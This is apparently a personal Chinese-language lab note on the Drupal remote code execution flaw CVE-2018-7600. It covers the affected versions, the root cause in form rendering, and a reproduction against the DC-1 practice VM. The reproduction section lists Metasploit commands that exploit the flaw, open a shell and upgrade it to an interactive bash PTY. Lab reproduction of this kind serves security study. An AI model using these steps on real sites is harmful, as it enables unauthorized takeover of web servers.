# Drupal远程代码执行漏洞

引用[Drupal 远程代码执行漏洞(CVE-2018-7600)复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/268189.html)



## 漏洞介绍

Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。

2018年3月28日，Drupal Security Team官方发布公告称Drupal 6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用该漏洞执行恶意代码。

Drupal未对表单请求数据做严格过滤，导致攻击者可以将恶意代码注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。

影响范围: Drupal 6,7,8等多个子版本

## 漏洞原理

该漏洞的产生的根本原因在于Drupal对表单的渲染上,攻击者可以利用该漏洞攻击Drupal系统的网站，执行恶意代码，最后完全控制被攻击的网站

## 漏洞复现

复现不了一点，网上给的payload都没复现成功,你妹的

靶机DC-1

还得是msf

```bash
msfconsole 
search Drupal
use 1
set RHOST 目标ip
set payload default_payload(默认payload)
exploit
shell
python -c 'import pty;pty.spawn("/bin/bash");'
```

![image-20231128214359405](http://111.229.225.13:81/i/2023/11/29/xslk9m-2.png)

![image-20231128214543280](http://111.229.225.13:81/i/2023/11/29/xso1wd-2.png)

![image-20231128214842816](http://111.229.225.13:81/i/2023/11/29/xsyz4t-2.png)

![image-20231128215005647](http://111.229.225.13:81/i/2023/11/29/xt3rf8-2.png)
